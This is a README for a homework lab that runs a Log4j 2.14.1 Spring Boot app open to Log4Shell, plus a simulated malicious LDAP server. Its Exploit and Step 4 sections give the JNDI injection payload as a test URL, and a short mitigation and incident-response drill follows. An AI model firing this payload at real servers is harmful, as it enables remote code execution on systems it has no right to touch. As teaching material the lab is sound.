# Log4Shell Vulnerable Environment

This project demonstrates the Log4Shell vulnerability in a Spring Boot application using Log4j 2.14.1 and simulates an attacker-controlled LDAP server.

## Project Structure
- `app/` — Java application vulnerable to Log4Shell
- `ldap_server.py` — Simulated malicious LDAP server
- `docker-compose.yml` — Launches both services

## How to Run It Locally
1. Make sure Docker Desktop is running.
2. Run from the project root:
   ```bash
   docker compose up --build
   ```

## Exploit
Visit:
```
http://localhost:8080/vulnerable?userInput=${jndi:ldap://localhost:1389/a}
```

## Mitigation
- Upgrade to Log4j 2.17.1+
- Add JVM option `-Dlog4j2.formatMsgNoLookups=true`
- Sanitize inputs


##  How to Run in Docker Desktop (Step-by-Step)

### Step 1: Prerequisites
- Ensure Docker Desktop is installed and running.

### Step 2: Open a Terminal
Navigate to the project folder:
```bash
cd path/to/log4shell-homework
```

### Step 3: Start the Environment
```bash
docker compose up --build
```
This will build the Java app and start both the vulnerable app and LDAP exploit server.

### Step 4: Test the Vulnerability
Open your browser and visit:
```
http://localhost:8080
```
Then test the exploit:
```
http://localhost:8080/vulnerable?userInput=${jndi:ldap://localhost:1389/a}
```

### Step 5: Simulate Incident Response (MITRE REACT)

####  Detect
```bash
docker logs log4shell-homework-vulnerable-app-1 | findstr jndi
```

####  Contain
```bash
docker stop log4shell-homework-vulnerable-app-1
```

####  Eradicate
```bash
docker ps -a
```

####  Recover
```bash
docker compose down
```
Then restart:
```bash
docker compose up -d --build
```
Test with:
```bash
curl "http://localhost:8080/vulnerable?userInput=HelloWorld"
```

### Step 6: Shut Down
```bash
docker compose down
```

This completes the Log4Shell simulation and mitigation cycle.
